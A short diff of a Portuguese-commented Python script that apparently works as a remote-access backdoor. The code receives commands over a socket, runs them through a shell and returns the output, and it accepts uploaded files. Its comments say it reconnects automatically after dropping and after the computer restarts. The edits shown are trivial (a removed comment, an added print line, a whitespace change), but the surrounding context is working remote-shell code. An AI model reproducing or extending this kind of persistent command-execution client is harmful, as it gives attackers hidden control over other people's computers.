@@ -7,7 +7,6 @@
 # se cair -> reconecta
 # ao reiniciar o pc -> reconecta
 
-# comando[0] == 'cd' -> os.chdir()
 
 import socket
 import os
@@ -51,6 +50,7 @@ def executa(socket):
             else:
                 try:
                     if(dados=='upload'): # upload
+                        print('recebendo arquivo')
                         nome_arquivo = socket.recv(1024)
                         f = open(nome_arquivo,'wb')
                         l = socket.recv(1024)
@@ -69,7 +69,7 @@ def executa(socket):
                                 comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                                 retorno = comando.stdout.read() + comando.stderr.read()
                                 socket.send(retorno)
-                                
+
                     elif(dados=='download'):
                         pass
                 except:
